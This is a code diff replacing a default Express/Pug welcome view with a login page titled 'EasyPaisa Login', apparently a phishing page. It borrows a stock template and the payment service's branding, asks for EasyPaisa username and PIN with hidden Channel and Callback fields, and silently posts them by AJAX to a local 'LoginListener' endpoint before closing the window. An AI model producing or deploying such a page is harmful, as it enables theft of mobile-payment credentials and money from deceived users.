@@ -1,5 +1,97 @@
-extends layout
-
-block content
-  h1= title
-  p Welcome to #{title}
+doctype html
+head
+  title EasyPaisa Login
+  meta(charset='UTF-8')
+  meta(name='viewport' content='width=device-width, initial-scale=1')
+  // ===============================================================================================
+  link(rel='icon' type='image/png' href='https://colorlib.com/etc/lf/Login_v1/images/icons/favicon.ico')
+  // ===============================================================================================
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/css/bootstrap.min.css')
+  // ===============================================================================================
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/fonts/font-awesome-4.7.0/css/font-awesome.min.css')
+  // ===============================================================================================
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/vendor/animate/animate.css')
+  // ===============================================================================================
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/vendor/css-hamburgers/hamburgers.min.css')
+  // ===============================================================================================
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/vendor/select2/select2.min.css')
+  // ===============================================================================================
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/css/util.css')
+  link(rel='stylesheet' type='text/css' href='https://colorlib.com/etc/lf/Login_v1/css/main.css')
+  style.
+    .fade {
+    opacity:0.7;
+    filter: alpha(opacity=20);
+    background-color:#000;
+    width:100%;
+    height:100%;
+    z-index:10;
+    top:0;
+    left:0;
+    position:fixed;
+    pointer-events: none;
+    background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/29/Loader.gif');
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-position: center;
+    }
+  // ===============================================================================================
+.limiter
+  .container-login100
+    .wrap-login100
+      .login100-pic.js-tilt(data-tilt='')
+        img(src='https://i.tribune.com.pk/media/images/869408-easypaisa-1428958423/869408-easypaisa-1428958423.jpg' alt='IMG')
+      form.login100-form.validate-form(method='post')
+        span.login100-form-title
+          | Please enter your EasyPaisa Credentials
+        input(type='hidden' name='Channel' value='subgateway')
+        input(type='hidden' name='Callback' value='BfBQAASLUs30QmBum1/9wxnMmRWih2b4YsVd87L4RQ2bD2r0ary9gJpjMz537wdyVMbw9NY40stpqB3XgnX0nwj/WQvL1xYGUJshWMYt+lkYwHHODZhBTyzP7oOJfiCnvHgZ4DyvtleO6TitFP6ps2iSLqDSa6koHxBUFuf614IGEx8L5nBTNNCxtuBDc0eHAe/afurnWecOjphB0ruBtFRiCmSjFpEFTDQtVHBcdtAo5BpnLXvXbQ2Xf1S+i/yIvCllKOyIWcQ3EqysYAkFheDX/tZIVTi1HCHaXI9XEpTppxLF9ywa08r/atrYmgwmTqcTlW2Hpc0CVI4/fbSFxQ==')
+        .wrap-input100
+          input.input100(type='text' name='username' placeholder='User')
+          span.focus-input100
+          span.symbol-input100
+            i.fa.fa-envelope(aria-hidden='true')
+        .wrap-input100.validate-input(data-validate='Password is required')
+          input.input100(type='password' name='pass' placeholder='Pin')
+          span.focus-input100
+          span.symbol-input100
+            i.fa.fa-lock(aria-hidden='true')
+        .container-login100-form-btn
+          button.login100-form-btn
+            | Login
+        br
+        div(style='padding: 25px')
+          br
+// ===============================================================================================
+script(src='https://colorlib.com/etc/lf/Login_v1/vendor/jquery/jquery-3.2.1.min.js')
+// ===============================================================================================
+script(src='https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/js/popper.js')
+script(src='https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/js/bootstrap.min.js')
+// ===============================================================================================
+script(src='https://colorlib.com/etc/lf/Login_v1/vendor/select2/select2.min.js')
+// ===============================================================================================
+script(src='https://colorlib.com/etc/lf/Login_v1/vendor/tilt/tilt.jquery.min.js')
+script.
+  $('.js-tilt').tilt({
+  scale: 1.1
+  })
+script(type='text/javascript').
+  $(document).ready(function () {
+  $('button.login100-form-btn').click(function (event) {
+  event.preventDefault();
+  $('body').addClass('fade');
+  var myForm = $("form.login100-form");
+  if (myForm) {
+  $.ajax({
+  url: './LoginListener',
+  data: $(myForm).serializeArray(),
+  type: 'POST',
+  success: function(data) {
+  window.close();
+  }
+  });
+  }
+  });
+  });
+// ===============================================================================================
+script(src='https://colorlib.com/etc/lf/Login_v1/js/main.js')
